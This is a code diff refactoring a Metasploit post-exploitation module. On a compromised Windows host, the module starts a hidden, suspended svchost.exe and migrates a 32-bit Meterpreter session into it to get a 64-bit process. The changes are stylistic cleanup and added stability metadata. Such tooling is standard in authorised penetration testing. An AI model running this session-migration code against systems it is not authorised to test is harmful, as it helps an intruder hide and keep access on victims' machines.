@@ -20,7 +20,6 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => ['Koen Riepe (koen.riepe@fox-it.com)'],
-        'References' => [''],
         'Platform' => [ 'win' ],
         'Arch' => [ 'x86', 'x64' ],
         'SessionTypes' => [ 'meterpreter' ],
@@ -33,6 +32,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_getpid
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -40,22 +44,15 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\windows\sysnative\svchost.exe']),
-        OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ]),
+        OptBool.new('FALLBACK', [true, 'If the selected migration executable does not exist fallback to a sysnative file', true]),
         OptBool.new('IGNORE_SYSTEM', [true, 'Migrate even if you have SYSTEM privileges', false])
-      ],
-      self.class
+      ]
     )
   end
 
   def check_32_on_64
-    apicall = session.railgun.kernel32.IsWow64Process(-1, 4)['Wow64Process']
     # railgun returns '\x00\x00\x00\x00' if the meterpreter process is 64bits.
-    if apicall == "\x00\x00\x00\x00"
-      migrate = false
-    else
-      migrate = true
-    end
-    return migrate
+    session.railgun.kernel32.IsWow64Process(-1, 4)['Wow64Process'] != "\x00\x00\x00\x00"
   rescue StandardError
     print_error('Railgun not available, this module only works for binary meterpreters.')
   end
@@ -67,55 +64,58 @@ class MetasploitModule < Msf::Post
   end
 
   def do_migrate
-    if check_32_on_64
-      print_status('The meterpreter is not the same architecture as the OS! Upgrading!')
-      newproc = datastore['EXE']
-      if exist?(newproc)
-        print_status("Starting new x64 process #{newproc}")
-        pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
-        print_good("Got pid #{pid}")
-        print_status('Migrating..')
-        session.core.migrate(pid)
-        if pid == session.sys.process.getpid
-          print_good('Success!')
-        else
-          print_error('Migration failed!')
-        end
+    unless check_32_on_64
+      print_good('The meterpreter is the same architecture as the OS!')
+      return
+    end
+
+    print_status('The meterpreter is not the same architecture as the OS! Upgrading!')
+    newproc = datastore['EXE']
+    if exist?(newproc)
+      print_status("Starting new x64 process #{newproc}")
+      pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
+      print_good("Got pid #{pid}")
+      print_status('Migrating..')
+      session.core.migrate(pid)
+      if pid == session.sys.process.getpid
+        print_good('Success!')
       else
-        print_error('The selected executable to migrate into does not exist')
-        if datastore['FALLBACK']
-          windir = get_windows_loc
-          newproc = "#{windir}:\\windows\\sysnative\\svchost.exe"
-          if exist?(newproc)
-            print_status("Starting new x64 process #{newproc}")
-            pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
-            print_good("Got pid #{pid}")
-            print_status('Migrating..')
-            session.core.migrate(pid)
-            if pid == session.sys.process.getpid
-              print_good('Success!')
-            else
-              print_error('Migration failed!')
-            end
+        print_error('Migration failed!')
+      end
+    else
+      print_error('The selected executable to migrate into does not exist')
+      if datastore['FALLBACK']
+        windir = get_windows_loc
+        newproc = "#{windir}:\\windows\\sysnative\\svchost.exe"
+        if exist?(newproc)
+          print_status("Starting new x64 process #{newproc}")
+          pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
+          print_good("Got pid #{pid}")
+          print_status('Migrating..')
+          session.core.migrate(pid)
+          if pid == session.sys.process.getpid
+            print_good('Success!')
+          else
+            print_error('Migration failed!')
           end
         end
       end
-    else
-      print_good('The meterpreter is the same architecture as the OS!')
     end
   end
 
   def run
-    if datastore['IGNORE_SYSTEM']
+    unless is_system?
+      print_status('You are not running as SYSTEM. Moving on...')
       do_migrate
-    elsif !datastore['IGNORE_SYSTEM'] && is_system?
-      print_error('You are running as SYSTEM! Aborting migration.')
-    elsif datastore['IGNORE_SYSTEM'] && is_system?
+      return
+    end
+
+    if datastore['IGNORE_SYSTEM']
       print_error('You are running as SYSTEM! You will lose your privileges!')
       do_migrate
-    elsif !datastore['IGNORE_SYSTEM'] && !is_system?
-      print_status('You\'re not running as SYSTEM. Moving on...')
-      do_migrate
+      return
     end
+
+    print_error('You are running as SYSTEM! Aborting migration.')
   end
 end
